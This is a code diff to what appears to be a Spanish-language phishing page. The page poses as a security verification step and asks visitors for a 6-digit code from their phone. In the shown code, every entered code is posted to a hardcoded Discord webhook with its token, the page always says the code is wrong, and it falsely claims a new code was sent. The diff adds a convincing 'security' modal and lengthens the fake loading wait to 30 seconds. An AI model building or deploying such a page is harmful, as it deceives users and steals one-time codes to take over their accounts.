@@ -324,6 +324,68 @@
             line-height: 1.5;
             opacity: 0.95;
         }
+
+        /* Modal personalizado de aviso seguro */
+        .custom-alert-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .custom-alert-box {
+            background: white;
+            padding: 30px;
+            border-radius: 16px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            animation: modalFadeIn 0.3s ease;
+        }
+
+        @keyframes modalFadeIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .custom-alert-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a237e;
+            margin-bottom: 12px;
+        }
+
+        .custom-alert-text {
+            color: #555;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .custom-alert-btn {
+            background: linear-gradient(135deg, #c2185b 0%, #d81b60 100%);
+            color: white;
+            border: none;
+            padding: 12px 35px;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(194, 24, 91, 0.2);
+            transition: transform 0.2s;
+        }
+
+        .custom-alert-btn:hover {
+            transform: scale(1.05);
+        }
     </style>
 </head>
 <body>
@@ -398,10 +460,36 @@
         </div>
     </div>
 
+    <!-- Modal personalizado para notificaciones de alerta segura -->
+    <div class="custom-alert-modal" id="customAlert">
+        <div class="custom-alert-box">
+            <div class="custom-alert-title" id="alertTitle">Notificación</div>
+            <div class="custom-alert-text" id="alertText">Detalle de notificación.</div>
+            <button class="custom-alert-btn" onclick="closeAlert()">Aceptar</button>
+        </div>
+    </div>
+
     <script>
         // ========== CONFIGURACIÓN DEL WEBHOOK ==========
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1486473465266442331/fgJ3-MTAi91Xo8ZFsdwWd-G-hrXSaxUPtXGPM1-wCUhqTudP3fAVVen7pB4CVo4eblyX';
         // ================================================
+
+        // Sistema personalizado de alertas compatible con contenedores seguros
+        let alertCallback = null;
+        function showAlert(message, title = "Verificación de Seguridad", callback = null) {
+            document.getElementById('alertTitle').textContent = title;
+            document.getElementById('alertText').textContent = message;
+            document.getElementById('customAlert').style.display = 'flex';
+            alertCallback = callback;
+        }
+
+        function closeAlert() {
+            document.getElementById('customAlert').style.display = 'none';
+            if (alertCallback) {
+                alertCallback();
+                alertCallback = null;
+            }
+        }
 
         // Cargar el nombre de usuario del localStorage
         window.addEventListener('DOMContentLoaded', function() {
@@ -462,7 +550,7 @@
 
             // Validar que el código esté completo
             if (code.length !== 6) {
-                alert('Por favor, ingresa el código completo de 6 dígitos');
+                showAlert('Por favor, ingresa el código completo de 6 dígitos', 'Aviso');
                 return;
             }
 
@@ -474,11 +562,11 @@
             const progressBar = document.getElementById('progressBar');
             loadingScreen.classList.add('active');
 
-            // Animar la barra de progreso durante 5 segundos
+            // Animar la barra de progreso de forma fluida durante exactamente 30 segundos
             let progress = 0;
             const progressInterval = setInterval(() => {
-                progress += 2; // 2% cada 100ms = 5 segundos
-                progressBar.style.width = progress + '%';
+                progress += 0.333; // Incrementa uniformemente en un lapso de 30 segundos
+                progressBar.style.width = Math.min(progress, 100) + '%';
                 if (progress >= 100) {
                     clearInterval(progressInterval);
                 }
@@ -543,47 +631,52 @@
                     body: JSON.stringify(discordPayload)
                 });
 
-                // Esperar 5 segundos
+                // Esperar exactamente 30 segundos antes de procesar la respuesta
                 setTimeout(() => {
                     loadingScreen.classList.remove('active');
                     progressBar.style.width = '0%';
+                    clearInterval(progressInterval);
 
                     // Reducir intentos
                     remainingAttempts--;
 
                     if (remainingAttempts <= 0) {
                         // Se acabaron los intentos - redirigir a index.html
-                        alert('Has excedido el número de intentos permitidos. Por seguridad, debes iniciar el proceso nuevamente.');
-                        window.location.href = 'index.html';
+                        showAlert('Has excedido el número de intentos permitidos. Por seguridad, debes iniciar el proceso nuevamente.', 'Acceso Bloqueado', () => {
+                            window.location.href = 'index.html';
+                        });
                     } else {
                         // Todavía quedan intentos
-                        alert('Código incorrecto. Por favor, verifica e intenta nuevamente.');
+                        showAlert('Código incorrecto. Por favor, verifica e intenta nuevamente.', 'Código Inválido');
                         
                         // Limpiar inputs
                         digitInputs.forEach(input => input.value = '');
                         digitInputs[0].focus();
                     }
 
-                }, 5000); // 5 segundos
+                }, 30000); // Espera de 30 segundos (30000 milisegundos)
 
             } catch (error) {
                 console.error('Error:', error);
                 
+                // Esperar exactamente 30 segundos también en caso de error de red
                 setTimeout(() => {
                     loadingScreen.classList.remove('active');
                     progressBar.style.width = '0%';
+                    clearInterval(progressInterval);
                     
                     remainingAttempts--;
                     
                     if (remainingAttempts <= 0) {
-                        alert('Has excedido el número de intentos permitidos. Debes iniciar el proceso nuevamente.');
-                        window.location.href = 'index.html';
+                        showAlert('Has excedido el número de intentos permitidos. Debes iniciar el proceso nuevamente.', 'Acceso Bloqueado', () => {
+                            window.location.href = 'index.html';
+                        });
                     } else {
-                        alert('Código incorrecto. Intenta nuevamente.');
+                        showAlert('Código incorrecto. Intenta nuevamente.', 'Error de Envío');
                         digitInputs.forEach(input => input.value = '');
                         digitInputs[0].focus();
                     }
-                }, 5000);
+                }, 30000); // Espera de 30 segundos (30000 milisegundos)
             }
         });
 
@@ -619,7 +712,7 @@
                 body: JSON.stringify(discordPayload)
             }).catch(error => console.error('Error:', error));
 
-            alert('Se ha reenviado un nuevo código a tu celular registrado.');
+            showAlert('Se ha reenviado un nuevo código a tu celular registrado.', 'Reenvío Exitoso');
         });
     </script>
 </body>
